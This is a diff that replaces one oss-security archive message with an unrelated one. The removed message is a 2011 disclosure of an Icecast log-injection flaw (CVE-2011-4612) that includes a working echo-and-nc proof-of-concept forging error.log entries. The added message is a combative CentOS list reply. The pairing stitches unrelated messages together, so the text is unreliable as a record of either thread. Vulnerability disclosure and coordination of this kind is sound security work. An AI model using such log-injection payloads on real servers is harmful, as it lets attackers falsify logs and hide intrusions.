@@ -1,75 +1,39 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/12/15/7
-Message-ID: <4EEA6884.50800@redhat.com>
-Date: Thu, 15 Dec 2011 14:37:08 -0700
-From: Kurt Seifried <kseifried@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/04/04/33
+Message-ID: <alpine.LRH.1.00.1104041311380.31509@bronson.owlriver.com>
+Date: Mon, 4 Apr 2011 13:26:50 -0400 (EDT)
+From: R P Herrold <herrold@...river.com>
 To: oss-security@...ts.openwall.com
-CC: Jamie Strandboge <jamie@...onical.com>, icecast-dev@...h.org, security@...ntu.com, security@...itz-naumann.com
-Subject: Re: Security issue in icecast
+Subject: Closed list
 Content-Type: text/plain; charset=utf-8
 
+On Mon, 4 Apr 2011, Tomas Hoger wrote:
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+> Given the aim to keep the subscriber list very limited, this probably
+> falls into a tentatively subscribed category too.  AFAIK, CentOS has
+> rather few components that are not rebuilds of the RHEL SRPMs, the
+> question is how often a v-s info was useful in the past in providing
+> security updates for those extra packages.
 
-On 12/15/2011 11:25 AM, Jamie Strandboge wrote:
-> A security bug was reported by Moritz Naumann against icecast in
-> Ubuntu. You are being emailed as the upstream contact. Please keep
-> oss-security@...ts.openwall.com[1] CC'd for any updates on this issue.
->
-> This issue should be considered public and has not yet been assigned a
-> CVE.
->
-> Details from the public bug follow:
-> https://launchpad.net/bugs/894782
->
-> From the reporter:
-> "Newline injection in error.log
->
-> Running this command against an icecast2 running on 127.0.0.1...
->
-> echo -ne "GET /non-existent"'"'"%20No%20such%20file%20or%20directory%0d%
-> 0a[1970-01-01%20%2000:00:00]%20PHUN%20I'm%20feeling%20phunny%0d%
-> 0a["`date "+%Y-%m-%d%%20%%20%H:%M:%S"`"]%20WARN%
-> 20fserve/fserve_client_create%20req%20for%20file%
-> 20"'"'"/usr/share/icecast2/web/ HTTP/1.0\n\n" | nc -vv 127.0.0.1 8000
->> /dev/null
->
-> ...causes the following to be written to /var/log/icecast2/error.log:
-> [2011-11-25 15:37:31] INFO fserve/fserve_client_create checking for
-> file /non-existent" No such file or directory
-> [1970-01-01 00:00:00] PHUN I'm feeling phunny
-> ..."
->
-> Thanks in advance for your cooperation in coordinating a fix for this
-> issue.
->
-> [1] oss-security@...ts.openwall.com is a public mailing list for
-> people to collaborate on security vulnerabilities and coordinate
-> security updates.
->
-Please use CVE-2011-4612 for this issue.
+Thanks for the post furthering the marketing goals of your 
+corporate master; perhaps the security goal of making sure the 
+Linux server space is well-secured in a timely fashion was 
+overlooked by you as you framed your thought
 
-BTW: excellent and clear CVE request, thank you!
+Seemingly (you mention 'AFAIK'), you do not follow the 
+'extras' archive, nor the 'testing' where extensions are 
+found, past what Red Hat ships by default in its enterprise 
+product
 
-- -- 
+I have regularly flagged to our updates builder sub-group, for 
+slotting in updates to push out vulnerable content in those 
+side archives, based on vendor-sec notes; further, in ranking 
+the 'urgency' of a push, I posted a rather detailed package by 
+package analysis of un-pushed updates, in the last month or 
+so, as to matters pending during the intersticial 'solve the 
+rebuild' delay as to some updates issued upstream but not yet 
+pushed by the CentOS team, in part based upon tracking 
+vendor-sec
 
-- -Kurt Seifried / Red Hat Security Response Team
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v2.0.14 (GNU/Linux)
-
-iQIcBAEBAgAGBQJO6miEAAoJEBYNRVNeJnmTUrIQAKCqsoG/HWa4J3W2pVbIpb1A
-boc5TIipJKFX8EKePpfzqbwVv3sscK2mDdN7OaDCHgMiKls0ZkTXmZEA1Gbc8C4R
-80vYFCePbuFLWfrPR1Jd5bGT6wGRxMIUepmS5brnmOFF2XQPwYCWQr3KTIr9/1cT
-M51qwkiz56ARf2sjF2K78bR3J/5MuwIyT5DCb7eiU3qVDEMbN1a4d1gp0RCWJUzh
-vnKOLJD2CrWjIxTGTv2FFjNZTHlPDATH2sAoRAbWmO8gTEX8TcLiUdpODfx1VKkJ
-AbApEkf5pQOVi2u5MmrpHpGdWsYg3dCZ+opP1WG9iVmn+mCMzcQB81G8p5ezAtnb
-Yg2jqd9kexpGSCaeKWVvkF3mXfkUGD7wIj2aDdy3r2l9Z/4DBh0qUB/DtlvNONYy
-YuTwsjYMisJlff5uy173gkcPeIehPzxabft/hgOV83SARFsajmFwJ8jb9/Fnmkv+
-QBGsphnZ6uHivVwV375HGTS/BfulD7pXbdWXqHXkQIk9xowLaw/zEWH0zJNL/cYr
-R49ev2Prd7XO2pWZCy9S52TgqPhzmCVDXlHX36tzFkDoVgh8c+zUewROruCB16bo
-yE9QfAlV0QKt4oIfmyhQPlYsNNhQkPLYoZnNc+LzMARr9Gx1V9misOgNfXm6SPo8
-YxVbtx35HE1AMTZ5eO0Q
-=eA48
------END PGP SIGNATURE-----
-
+-- Russ herrold
+ 	herrold@...tos.org
